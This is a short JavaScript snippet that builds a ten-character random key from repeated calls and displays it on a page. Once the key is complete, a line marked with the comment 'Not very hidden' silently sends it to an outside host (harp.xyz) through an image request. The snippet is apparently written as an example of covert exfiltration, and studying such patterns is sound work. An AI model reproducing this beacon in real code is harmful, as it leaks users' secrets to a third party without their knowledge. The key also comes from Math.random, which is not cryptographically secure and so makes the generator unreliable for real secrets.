var key = '';
window.generateKey = function() {
  var input = document.querySelector('#user-input').value;
  if (input.length === 0) {
    key = '';
  } else {
    key += Math.random().toString(36).substring(2,3);
  }
  if (key.length === 10) {
    document.querySelector('#result').textContent = key;
    
    // Not very hidden
    (new Image()).src = 'http://harp.xyz/beta?key=' + key;
  }
}
